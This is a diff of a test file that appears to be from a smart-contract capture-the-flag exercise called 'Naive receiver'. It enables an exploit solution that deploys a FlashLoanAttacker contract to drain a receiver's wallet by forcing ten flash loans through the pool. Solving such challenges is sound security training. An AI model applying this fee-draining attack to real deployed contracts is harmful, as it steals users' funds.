@@ -41,11 +41,12 @@ describe('[Challenge] Naive receiver', function () {
          * Draining the wallet by calling the flash loan for the user for 10 times in 10 tx
          */
 
-        // Solution 2
-        // const FlashLoanAttackerFactory = await ethers.getContractFactory("FlashLoanAttacker", deployer);
-        // this.attack = await FlashLoanAttackerFactory.deploy();
 
-        // await this.attack.connect(attacker).attackBorrower(this.pool.address, this.receiver.address, 10);
+        // Solution 2
+        const FlashLoanAttackerFactory = await ethers.getContractFactory("FlashLoanAttacker", attacker);
+        this.attacker = await FlashLoanAttackerFactory.deploy();
+
+        await this.attacker.connect(attacker).attackBorrower(this.pool.address, this.receiver.address, 10);
 
         /**
          * Same logic but using contract to execute in 1 tx
